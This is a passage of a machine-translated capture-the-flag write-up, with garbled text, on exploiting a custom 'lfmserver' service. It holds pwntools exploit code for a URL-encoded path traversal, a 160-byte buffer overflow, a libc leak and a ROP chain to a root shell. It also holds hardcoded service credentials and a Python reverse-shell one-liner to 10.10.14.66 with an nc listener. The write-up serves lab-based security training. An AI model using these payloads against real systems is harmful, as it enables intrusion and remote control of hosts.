ููุงุชุตุงู ุจุงูุฎุงุฏู ูุงุณุชุฎุฏุงู ุงูุจูุงูุงุช ูู ููู checker.py ุ ููุฐูู ุจูุงูุงุช ุงูุงุนุชูุงุฏ. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/xh/7b/aa/xh7baayunbtjue28qyfleddzqxc.png" alt="ุตูุฑุฉ"><br>
<br>
<img src="https://habrastorage.org/webt/-r/rp/mo/-rrpmoh0l0-hginwoubihqb3a_g.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุฏุนููุง ููุชุจ ูุงูุจ ุจุฑูุฌูุฉ ุฅูุณุจูููุช.</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python3</span><font></font>
<font></font>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<font></font>
<font></font>
context(os=<span class="hljs-string">"linux"</span>, arch=<span class="hljs-string">"amd64"</span>)<font></font>
HOST = <span class="hljs-string">"127.0.0.1"</span>
PORT = <span class="hljs-number">8888</span>
username = <span class="hljs-string">"lfmserver_user"</span>
password = <span class="hljs-string">"!gby0l0r0ck$$!"</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุฏุนูุง ุงูุขู ูุญุฏุฏ ุงูุทูุจ. </font><font style="vertical-align: inherit;">ุจุฏุก ุชุทุจูู. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/wx/xj/iu/wxxjiuq1vfqmwzgrshyjzlmzzou.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุฌุจ ุนููู ุฅุฑุณุงู ุงููุณุงุฑ ุฅูู ุงูููู ูุชุฌุฒุฆุฉ ูุญุชููุงุชู. </font><font style="vertical-align: inherit;">ุนูู ุณุจูู ุงููุซุงู ุ ุฃุฎุฐุช / etc / hosts. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/p0/3k/ek/p03kekiuesrd9mc2at4t_swcce0.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุฃุถู ุงูููุฏ ุงูุชุงูู ุฅูู ุงููุงูุจ.</font></font><br>
<br>
<pre><code class="python hljs">INPUTREQ = <span class="hljs-string">"CHECK /{} LFM\r\nUser={}\r\nPassword={}\r\n\r\n{}\n"</span>
file = <span class="hljs-string">"/etc/hosts"</span>
md5sum = <span class="hljs-string">"7d8fc74dc6cc8517a81a5b00b8b9ec32"</span><font></font>
send_ = INPUTREQ.format(file,username, password, md5sum)<font></font>
<font></font>
r = remote(HOST, PORT)<font></font>
r.sendline(send_.encode())<font></font>
<font></font>
r.interactive()</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ููุฐ ุงูุขู ูุงุญุตู ุนูู ุงูุฎุทุฃ 404. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ej/nd/b6/ejndb6z2tpkgvajgiq3akvwsbjg.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุฏุนูุง ูุฑู ููู ุงูุณุฌู. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/qy/d6/gf/qyd6gftg9f6m3ce87f9acdpsodc.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูู ุงููุงุถุญ ุฃูู ูุจุญุซ ุงูุชุทุจูู ุนู ููู ุ ููููุนุจ ูุน ุงููุณุงุฑุงุช ููุญุฏุฏ ูุซู ูุฐุง ุงูููู.</font></font><br>
<br>
<pre><code class="python hljs">file = <span class="hljs-string">"../../../../../etc/hosts"</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุณูููู ุจุชูููุฐ ุงูุชุนูููุงุช ุงูุจุฑูุฌูุฉ ููู ูุฑู ุฃู ุฃุฎุทุงุก. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/px/sp/o-/pxspo-1bkqx14dpydxmj11odvyo.png" alt="ุตูุฑุฉ"><br>
<br>
<img src="https://habrastorage.org/webt/id/8x/7z/id8x7zspwbcbv1u9qmx-ccjhiis.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูููู ูู ุญุงูุฉ urlencode ุ ูุญุตู ุนูู ุงุณุชุฌุงุจุฉ ุจุฑูุฒ 200 ูู ุงูุฎุงุฏู!</font></font><br>
<br>
<pre><code class="python hljs">file = <span class="hljs-string">"%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fhosts"</span></code></pre><br>
<img src="https://habrastorage.org/webt/uh/pt/s6/uhpts6ydsvnhutaadndkfzt_ejy.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุฑุงุฆุน ุ ุฏุนูุง ูุนูุฏ ุฅูู ุงููููู. ูุฌุฏ ุจูู ุงูุณุทูุฑ (Shift + F12) ุงุณุชุฌุงุจุฉ ุงูุฎุงุฏู ุงููุงุฌุญุฉ. ูุฏุนูุง ูุฑู ุฃูู ูุชู ุงููุตูู ุฅููู (X). </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ck/ef/so/ckefsoopnkpezgsq6cdlguv7jh8.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูููุชูู ุฅูู ุงููุธููุฉ ุงูุฃููู ุ ุญูุซ ููุฌุฏ ูู ุงูุจุฏุงูุฉ ุงูุชุญูู ูู ุฃูุฑุงู ุงูุงุนุชูุงุฏ. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/8v/6y/jg/8v6yjgpj94ih9fln0dmhbl3_zas.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุฏุนูุง ูุนูุฏ ุชุณููุฉ ุงูุฎุทูุท ุงููุชุบูุฑุฉ ูู ูุงูุฐุฉ ุฃุฏุงุฉ ุงูุชูููู ูุชุณููู ููููุง ูู ุฃุฏุงุฉ ูู ุงูุดูุฑุฉ. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/dz/ut/vx/dzutvxrxvyv4tdq_zgldkiv9xqw.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุชุญููู ุงูุชุนูููุงุช ุงูุจุฑูุฌูุฉ ูู ุงูุณุทูุฑ 18-24 ุ ููู ูุง ููู: ููุน ุฌุฒุก ูู ุฅุฏุฎุงู ุงููุณุชุฎุฏู ูู ุงูุฏุงูุฉ sub_402DB9 ุ ุญูุซ ูุชู ุชุญููู ุงูุณูุณูุฉ ุฅูู ุงุณู ุงููุชุบูุฑ ุ ูุงูุฐู ููุน ุจุนุฏ ุฐูู ูู ุฏุงูุฉ ุงููุตูู ุ ูุฅุฐุง ูุงูุช ุงููุชูุฌุฉ ุณูุจูุฉ ุ ุชููู ุงูุฑุณุงูุฉ 404 ูุงุชุฌุฉ. ุณูููู ุงุณู ุงููุชุบูุฑ ูู ุงููุณุงุฑ ุฅูู ุงูููู. ูุธุฑูุง ูุฃูู ุชูุช ูุนุงูุฌุฉ ุงูุทูุจ ุญุชู ูู ุชุดููุฑ urlencode ุ ููู ุงููุฑุฌุญ ุฃู ุชููู ูุฐู ุงููุธููุฉ ูุทููุจุฉ ููู ุงูุชุดููุฑ.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/mo/eb/wj/moebwjpolutcowo7qxeyi15dj-k.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ููู ุงูุญูููุฉ ูู ุฃู ุงุณู ุงููุชุบูุฑ ุ ุญูุซ ูุชู ููู ุงูุจูุงูุงุช ุ ูุญุฏูุฏ ุงูุญุฌู. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/u_/jz/ht/u_jzhtdqgp1vgp3qyuguunuxl_i.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุจุงูุชุงูู ุ ุจุงููุณุจุฉ ูุชุฏูู ุงููุฎุฒู ุงููุคูุช ุ ูุญุชุงุฌ ุฅูู ููู 0xA0 = 160 ุจุงูุช. ุฏุนูุง ูุถูู ูู ุงูููุฏ ูุธููุฉ ุฅุถุงูุฉ ูุง ูุตู ุฅูู 160 ุจุงูุช ูุชุฑููุฒ ุงููุณุงุฑ ุฅูู ุงูููู. ูุธุฑูุง ูุฃูู ูุชู ุญุณุงุจ ุงูุชุฌุฒุฆุฉ ูู ูุญุชููุงุช ุงูููู ุ ููู ุงูุถุฑูุฑู ุนุฏู ุงูุชูุงู ุณูุงูุฉ ูุณุงุฑ ุงูููู ุ ุฃู ุจุนุฏ ุฅุถุงูุฉ ุงููุณุงุฑ ุงูุฑุฆูุณู 0x00 ุจุงูุช. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ููู ุงูุญูููุฉ ูู ุฃููุง ุจุญุงุฌุฉ ุฅูู ูุนุฑูุฉ ุงูุชุฌุฒุฆุฉ ูู ุฃู ููู ุนูู ุงูุฎุงุฏู ุ ูุงูุฐู ุณูููู ูุชุงุญูุง ุฏุงุฆููุง ููู ูุชุบูุฑ ุฃุจุฏูุง. ุนูู ุณุจูู ุงููุซุงู / proc / sys / kernel / randomize_va_space ุ ูููุง ูุชุฐูุฑ ูู ูุงุชุฌ linPEAS ุ ูุชู ุชูุดูุท ASLR ุ ุฃู ุฃููุง ูุนุฑู ุงูุชุฌุฒุฆุฉ. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/tz/dk/j_/tzdkj_hdn9owhtmod5ekklqior4.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุซู ูู ุจุชุบููุฑ ุงูููุฏ.</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python3</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">append_and_encode</span>(<span class="hljs-params">file, rop=<span class="hljs-string">b""</span></span>):</span>
    ret = <span class="hljs-string">b""</span>
    path = (file + <span class="hljs-string">b"\x00"</span>).ljust(<span class="hljs-number">160</span>, <span class="hljs-string">b"A"</span>) + rop
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> path:<font></font>
        ret += <span class="hljs-string">b"%"</span> + hex(i)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">2</span>,<span class="hljs-string">"0"</span>).encode()
    <span class="hljs-keyword">return</span> ret<font></font>
<font></font>
context(os=<span class="hljs-string">"linux"</span>, arch=<span class="hljs-string">"amd64"</span>, log_level=<span class="hljs-string">"error"</span>)<font></font>
<font></font>
HOST = <span class="hljs-string">"127.0.0.1"</span>
PORT = <span class="hljs-number">8888</span>
INPUTREQ = <span class="hljs-string">b"CHECK /{1} LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\n{2}\n"</span>
md5sum = <span class="hljs-string">b"26ab0db90d72e28ad0ba1e22ee510510"</span><font></font>
<font></font>
payload = append_and_encode(<span class="hljs-string">b"../../../../../proc/sys/kernel/randomize_va_space"</span>)<font></font>
send_= INPUTREQ.replace(<span class="hljs-string">b"{1}"</span>, payload).replace(<span class="hljs-string">b"{2}"</span>, md5sum)<font></font>
r = remote(HOST, PORT)<font></font>
r.sendline(send_)<font></font>
r.interactive()</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุนูู ุจูุฌุงุญ! </font></font><br>
<br>
<img src="https://habrastorage.org/webt/k9/4f/5v/k94f5vkgarkqukz9vhjiprkt1yo.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุงูุขู ุฏุนูุง ูุณุชุฎุฏู ุชุณุฑุจ ุฐุงูุฑุฉ ููุญุฏุฏ ุงูุนููุงู ุญูุซ ูุชู ุชุญููู ููุชุจุฉ libc. </font><font style="vertical-align: inherit;">ููููุงู ุจุฐูู ุ ูุญุตู ุนูู ุนููุงู ูุธููุฉ ุงููุชุงุจุฉ ูู ููุชุจุฉ libc ุงููุญููุฉ.</font></font><br>
<br>
<pre><code class="python hljs">binary = ELF(<span class="hljs-string">"./lfmserver"</span>)<font></font>
libc = ELF(<span class="hljs-string">"./libc6.so"</span>)<font></font>
<font></font>
rop_binary = ROP(binary)<font></font>
rop_binary.write(<span class="hljs-number">0x6</span>, binary.got[<span class="hljs-string">'dup2'</span>])<font></font>
rop = flat(rop_binary.build())<font></font>
<font></font>
payload = append_and_encode(<span class="hljs-string">b"../../../../../proc/sys/kernel/randomize_va_space"</span>, rop)</code></pre><br>
<img src="https://habrastorage.org/webt/f0/5h/nl/f05hnlmsa7slih0sdwajq5kathy.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุงูุขู ุญุฏุฏ ุนููุงู ุงูุฏุงูุฉ dup2 (ุฃูู 8 ุจุงูุช). </font><font style="vertical-align: inherit;">ุงุทุฑุญ ุนููุงู ูุธููุฉ dup2 ูู ุงูููุชุจุฉ ุบูุฑ ุงููุญููุฉ ูููุง. </font><font style="vertical-align: inherit;">ุณูุฌุฏ ูุฐุง ุงูุนููุงู ุงูุฃุณุงุณู ูู libc.</font></font><br>
<br>
<pre><code class="python hljs">print(<span class="hljs-string">f"[*] Payload sent"</span>)<font></font>
<font></font>
recv_ = r.recvall().split(<span class="hljs-string">b'\r'</span>)<font></font>
leak = u64(recv_[<span class="hljs-number">-1</span>][:<span class="hljs-number">8</span>])<font></font>
print(<span class="hljs-string">f"[*] Leak address: <span class="hljs-subst">{hex(leak)}</span>"</span>)<font></font>
libc.address = leak - libc.symbols[<span class="hljs-string">'dup2'</span>]<font></font>
print(<span class="hljs-string">f"[+] Libc base: <span class="hljs-subst">{hex(libc.address)}</span>"</span>)</code></pre><br>
<img src="https://habrastorage.org/webt/xf/t0/x3/xft0x3qwddfzdrfclwkj578gzpk.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุงุจุญุซ ุงูุขู ุนู ุนููุงู ุงูุณุทุฑ / bin / sh.</font></font><br>
<br>
<pre><code class="python hljs">shell_address = next(libc.search(<span class="hljs-string">b"/bin/sh\x00"</span>))</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุจูู ุฌูุน ROP ุ ุญูุซ ุณูุชู ุฅุนุงุฏุฉ ุชูุฌูู ูุงุตูุงุช ุงูุฅุฏุฎุงู / ุงูุฅุฎุฑุงุฌ ุงูููุงุณูุฉ (0ุ1ุ2) ุฅูู ุงููุงุตู ุงููุณุฌู ูู ุงูุจุฑูุงูุฌ (ุฎุฐ 6). </font><font style="vertical-align: inherit;">ุจุนุฏ ุฐูู ุณูุชู ุงุณุชุฏุนุงุก ูุธููุฉ ุงููุธุงู ุ ุญูุซ ุณูููู ุจุชูุฑูุฑ ุนููุงู ุงูุณุทุฑ / bin / sh.</font></font><br>
<br>
<pre><code class="python hljs">rop_libc = ROP(libc)<font></font>
rop_libc.dup2(<span class="hljs-number">6</span>,<span class="hljs-number">0</span>)<font></font>
rop_libc.dup2(<span class="hljs-number">6</span>,<span class="hljs-number">1</span>)<font></font>
rop_libc.dup2(<span class="hljs-number">6</span>,<span class="hljs-number">2</span>)<font></font>
rop_libc.system(shell_address)<font></font>
rop = flat(rop_libc.build()) <font></font>
<font></font>
payload = append_and_encode(<span class="hljs-string">b"../../../../../proc/sys/kernel/randomize_va_space"</span>, rop)<font></font>
send_ = INPUTREQ.replace(<span class="hljs-string">b"{1}"</span>, payload).replace(<span class="hljs-string">b"{2}"</span>, md5sum)<font></font>
r = remote(HOST, PORT)<font></font>
r.sendline(send_)<font></font>
<font></font>
context.log_level=<span class="hljs-string">'info'</span><font></font>
r.recv()<font></font>
r.sendline(<span class="hljs-string">b"id"</span>)</code></pre><br>
<img src="https://habrastorage.org/webt/4a/fy/cq/4afycq7-ht7dkktpmeddwci4tqa.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุบุฑุงูุฉ! </font><font style="vertical-align: inherit;">ูุญุตู ุนูู ุงููุดุฑุฉ ูู ุงูุฌุฐุฑ. </font><font style="vertical-align: inherit;">ูููู ูููุช ุจุณุฑุนุฉ. </font><font style="vertical-align: inherit;">ูู ุจุชุดุบูู ุงููุณุชูุน (nc -lvp 8765) ูุฑูู ุบูุงู ุงูุงุชุตุงู ุงูุฎููู.</font></font><br>
<br>
<pre><code class="python hljs">r.sendline(<span class="hljs-string">b'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.66",8765));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''</span>)</code></pre><br>
<img src="https://habrastorage.org/webt/vj/nh/ci/vjnhcisc1ra9vng8htw8n_2phwi.png" alt="ุตูุฑุฉ"><br>
<br>
<img src="https://habrastorage.org/webt/tj/ff/ll/tjfflloqumm5mggkbrwlx2ofc6w.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ููุฏููุง ูุฐููุฉ ูุณุชูุฑุฉ. </font><font style="vertical-align: inherit;">ุฃุนุทู ุงูุฑูุฒ ุงููุงูู ูู ุงูุตูุฑุฉ ุฃุฏูุงู. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ow/ek/pi/owekpiviv3pqxnxr-rpeqgzv6-a.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ููู ูุง ูููููุง ูุฑุงุกุฉ ุนูู ุงูุฌุฐุฑ ...</font></font><br>
<br>
<img src="https://habrastorage.org/webt/wu/0u/mg/wu0umgzshoqcoq65eolwojhv8fy.png" alt="ุตูุฑุฉ"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุงูุฌุฐุฑ 3</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูู ุฎูุงู ุชุดุบูู linpeas ูุงููุธุฑ ูู ุงูุฅุฎุฑุงุฌ ุ ูุฌุฏ ุฃูุณุงููุง ูุซูุฑุฉ ููุงูุชูุงู ุ ุฎุงุตุฉ / dev / sda2. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/wu/0u/mg/wu0umgzshoqcoq65eolwojhv8fy.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุฏุนูุง ูุญุตู ุนูู ูุนูููุงุช ุญูู ุฌููุน ุฃุฌูุฒุฉ ุงูุญุธุฑ. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ld/ox/-v/ldox-vzassozbyooscg-issuoow.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุจุงูุชุงูู ูุฏููุง ูุณู ุงูุฌุฐุฑ / dev / sda2. </font><font style="vertical-align: inherit;">ูู ุจุฅูุดุงุก ุฏููู ูุชุฑููุจ ุงููุณู. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/u4/ez/c5/u4ezc5zbakdqx11phjzr1cqp-yi.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุฐูู ูุฌุฏ ุนูู ุงูุฌุฐุฑ. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ููููู ุงูุงูุถูุงู ุฅูููุง ุนูู </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telegram</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">ููุงู ููููู ุงูุนุซูุฑ ุนูู ููุงุฏ ูุซูุฑุฉ ููุงูุชูุงู ุ ูุฏูุฑุงุช ูุฏูุฌุฉ ุ ุจุงูุฅุถุงูุฉ ุฅูู ุงูุจุฑุงูุฌ. </font><font style="vertical-align: inherit;">ุฏุนููุง ูุฌูุน ูุฌุชูุนูุง ุณูููู ููู ุฃูุงุณ ุนูู ุฏุฑุงูุฉ ูู ุงูุนุฏูุฏ ูู ูุฌุงูุงุช ุชูููููุฌูุง ุงููุนูููุงุช ุ ุซู ูููููุง ุฏุงุฆููุง ูุณุงุนุฏุฉ ุจุนุถูุง ุงูุจุนุถ ูู ุฃู ูุถุงูุง ุชุชุนูู ุจุชูููููุฌูุง ุงููุนูููุงุช ูุฃูู ุงููุนูููุงุช.</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ar502256/index.html">ููู ุชุชุฎูู ุงูุฑุณู ุงูุจูุงูู ูุชูุงูู ุงูุฑุจูุน ุจุงุณุชุฎุฏุงู Neo4jุ</a></li>
<li><a href="../ar502260/index.html">ESP-NOW ูู ุจุฑูุชูููู ุงุชุตุงู ุจุฏูู ูู ESP8266 ู ESP32. ููุงููู ุฃุณุงุณูุฉ</a></li>
<li><a href="../ar502262/index.html">ููุงุฐุง AIOps ูุงููุฑุงูุจุฉ ุงูุดุงููุฉ ููุจูู ุ ุฃู ุนูู ูุง ูุชู ุจูุงุก ุนูุงูุงุช ุงูุนููุงุก</a></li>
<li><a href="../ar502264/index.html">ุงูุจููุฉ ุงูุชุญุชูุฉ ููููุชุงุญ ุงูุนุงู. ุฅุตุฏุงุฑ ุงูุดูุงุฏุงุช ุจุดุฑูุท ุงูุนุฒู ุงูุฐุงุชู</a></li>
<li><a href="../ar502266/index.html">ุฃูุฑูุฑุง ุนูู ููุตุฉ ุฅูุชู. ูุฌุฑ ุนุตุฑ Exaflops</a></li>
<li><a href="../ar502272/index.html">ูุง ุชูู "ุฃุดุนุฑ ุจููุณู" ุ ูููุงุนุฏ ุงููุบุฉ ุงูุฅูุฌููุฒูุฉ ุงูุฃุฎุฑู ุงูุชู ุชููุฏ ุฅูู ุงูุฐููู</a></li>
<li><a href="../ar502274/index.html">ูู ุจุชุฎุตูุต ุชุฎุทูุท ููุญุฉ ุงูููุงุชูุญ ุงูุฎุงุฑุฌูุฉ ุนูู Android ุจุฏูู ุฌุฐุฑ</a></li>
<li><a href="../ar502276/index.html">ุทุฑููุฉ ูุงูุจุงู: ูุซุงู PNZ ุฑูู 2: ุงูุชุฏุฑูุจ ูุงูุฏูุฑุงุช</a></li>
<li><a href="../ar502278/index.html">ููููุฉ ุนุฏู ุชุญุฑูุฑ ุงุฎุชุจุงุฑุงุช ุจุงูุซูู</a></li>
<li><a href="../ar502286/index.html">ุฑูุจูุชุงุช ุงููุงุฑ</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>